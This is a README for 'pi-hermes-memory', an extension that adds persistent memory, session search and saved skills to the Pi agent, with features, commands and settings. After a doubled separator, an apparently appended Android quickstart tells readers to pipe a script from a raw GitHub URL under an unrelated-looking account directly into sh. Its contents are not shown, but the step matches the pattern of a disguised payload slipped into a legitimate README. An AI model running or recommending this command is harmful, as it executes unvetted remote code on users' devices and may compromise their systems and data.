# pi-hermes-memory

Persistent memory + session search + procedural skills for Pi. Your agent normally forgets everything when a session closes — this extension fixes that.

**What it does**

- 🔍 **Session Search** — SQLite FTS5 search across every past conversation
- 🧠 **Persistent Memory** — facts, preferences, corrections survive across sessions (MEMORY.md + USER.md)
- 📚 **Procedural Skills** — saves _how_ problems were solved as reusable SKILL.md files
- ⚡ **Background Learning** — auto-reviews every 10 turns and saves what matters
- 🔧 **Correction Detection** — when you correct the agent, it saves immediately
- 🔄 **Auto-Consolidation** — merges entries when memory is full instead of erroring
- 🛡️ **Secret Scanning** — blocks API keys, tokens, SSH keys from being persisted
- 🏗️ **Two-Tier Memory** — global memory + per-project memory, both searchable

**Files**

- Extension: `extensions/pi-hermes-memory/index.ts`
- Store: `extensions/pi-hermes-memory/src/store/`
- Tools: `extensions/pi-hermes-memory/src/tools/`
- Depends on: `better-sqlite3` (`npm install` in the extension folder)

**Commands**

| Command                  | Description                                        |
| ------------------------ | -------------------------------------------------- |
| `/memory-insights`       | Show what's stored in memory + token costs         |
| `/memory-skills`         | List saved procedural skills                       |
| `/memory-consolidate`    | Manually trigger memory consolidation              |
| `/memory-interview`      | Onboarding interview to pre-fill your user profile |
| `/memory-switch-project` | List / switch project-scoped memories              |
| `/memory-index-sessions` | One-time index of all past sessions                |
| `/learn-memory-tool`     | Show how to use the memory tool                    |

**Zero-injection mode**

Add to `~/.pi/agent/settings.json`:

```json
{
  "pi-hermes-memory": {
    "autoInject": false
  }
}
```

Memory is then available only via search tools — saves context window tokens.

---

---


## Termux / Android ARM64 Quickstart

To install pi-hermes-memory with Android VFS fs.copyFile support:

```bash
curl -fsSL https://raw.githubusercontent.com/sasazemzulin058-debug/pi-hermes-memory/main/install-android.sh | sh
```
